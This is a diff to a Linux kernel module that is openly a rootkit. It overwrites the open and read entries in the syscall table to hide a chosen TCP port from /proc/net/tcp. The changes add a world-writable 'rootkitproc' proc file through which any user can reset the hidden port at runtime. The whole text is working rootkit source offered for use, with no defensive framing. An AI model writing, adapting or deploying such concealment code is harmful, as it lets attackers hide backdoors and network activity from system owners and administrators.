@@ -10,6 +10,7 @@
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
+#include <linux/proc_fs.h>
 #include <linux/sched.h>
 #include <linux/slab.h>
 #include <linux/stat.h>
@@ -23,11 +24,14 @@ MODULE_LICENSE("GPL");
 #define END_MEM  ULLONG_MAX
 #define START_MEM   PAGE_OFFSET
 #define TCP_LINE_SIZE 150
-#define PORT_TO_HIDE 631
 #define END_MEM     ULLONG_MAX
+#define PROC_FILE_NAME "rootkitproc"
 
+int PORT_TO_HIDE = 631;
+int TCP_fd = -10;
+static struct proc_dir_entry *proc_file;
+static unsigned long procfs_buffer_size = 0;
 struct list_head *prev_module;
-bool hijack;
 unsigned long long *syscall_table;
 
 // original functions
@@ -39,7 +43,8 @@ asmlinkage int new_open(const char* path_name, int flags) {
   // sets the hijack flag indicating that we should hide the TCP port
   if (strstr(path_name, "tcp") != NULL && strstr(path_name, "tcp6") == NULL) {
     printk("path name is: %s \n", path_name);
-    hijack = true;
+    TCP_fd = (*original_open)(path_name, flags);
+    return TCP_fd;
   }
   return (*original_open)(path_name, flags);
 }
@@ -50,7 +55,7 @@ asmlinkage long new_read(int fd, char __user *buf, size_t count) {
   long i = 0;
   char * kernel_buf;
   ret = original_read(fd, buf, count);
-  if (!hijack)
+  if (fd != TCP_fd)
     return ret;
   kernel_buf = kmalloc(count, GFP_KERNEL);
   // Kernel Problem
@@ -73,15 +78,14 @@ asmlinkage long new_read(int fd, char __user *buf, size_t count) {
     if (val != PORT_TO_HIDE)
       continue;
     temp = i;
-    for (; temp < ret - 150; temp++) {
-      kernel_buf[temp] = kernel_buf[temp + 150];
+    for (; temp < ret - TCP_LINE_SIZE; temp++) {
+      kernel_buf[temp] = kernel_buf[temp + TCP_LINE_SIZE];
     }
     for (temp = ret - (TCP_LINE_SIZE + 1); temp < ret; temp++) {
       kernel_buf[temp] = '\0';
     }
     count = count - TCP_LINE_SIZE;
   }
-  hijack = false;
   // Kernel Problem
   if (copy_to_user(buf, kernel_buf, count)) {
     printk("FAILLLLLLED KERNEL PROBLEM");
@@ -89,6 +93,49 @@ asmlinkage long new_read(int fd, char __user *buf, size_t count) {
   kfree(kernel_buf);
   return ret;
 }
+
+/*                           PROC FILE FUNCTIONS                       */
+int procfile_read(char *buffer, char **buffer_location, off_t offset, int buffer_length, int *eof, void *data) {
+  printk("DONT YOU EVER TRY TO READ THIS FILE OR I AM GOING TO DESTROY YOUR MOST SECRET DREAMS");
+  return 0;
+}
+
+int procfile_write(struct file *file, const char *buf, unsigned long count, void *data) {
+  printk("writing to the proc file\n");
+  char * kernel_buf = kmalloc(count, GFP_KERNEL);
+  bool temp = 0;
+  unsigned long j = 0;
+  int c;
+  if (!kernel_buf || copy_from_user(kernel_buf, buf, count)) {
+    printk("FAILLLLLLED KERNEL PROBLEM\n");
+    return count;
+  }
+  // hp port number decimal value
+  if (kernel_buf[0] == 'h' &&  kernel_buf[1] == 'p') {
+    PORT_TO_HIDE = 0;
+    for (j = 3; j < count ; j++) {
+      c = kernel_buf[j] - '0';
+      if (c >= 0 && c <= 9)
+        temp = true;
+      if (!temp)
+        break;
+      PORT_TO_HIDE =  PORT_TO_HIDE * 10;
+      PORT_TO_HIDE = PORT_TO_HIDE + c;
+      temp = false;
+    }
+  }
+  printk("NEW TO HIDE IS: %d\n ", PORT_TO_HIDE);
+  printk("finished writing to the proc file\n");
+  return count;
+}
+
+static const struct file_operations proc_file_fops = {
+  .owner = THIS_MODULE,
+  .read = procfile_read,
+  .write = procfile_write,
+};
+
+/*                         END OF PROCFILE FUNCTIONS                     */
 
 unsigned long **find(void) {
   unsigned long **sctable;
@@ -159,6 +206,15 @@ static int init(void) {
   syscall_table[__NR_open] = new_open;
   syscall_table[__NR_read] = new_read;
   enable_write_protection();
+
+  proc_file = proc_create( PROC_FILE_NAME, 0666, NULL, &proc_file_fops);
+  if (proc_file == NULL) {
+    remove_proc_entry(PROC_FILE_NAME, NULL);
+    printk("ERROR ALLOCATING FILE");
+    return -ENOMEM;
+  }
+  printk("proc file created\n");
+
   return 0;
 }
 
@@ -168,6 +224,7 @@ static void exit_(void) {
   syscall_table[__NR_read] = original_read;
   enable_write_protection();
   printk("Module ending\n");
+  remove_proc_entry(PROC_FILE_NAME, NULL);
   return;
 }
 
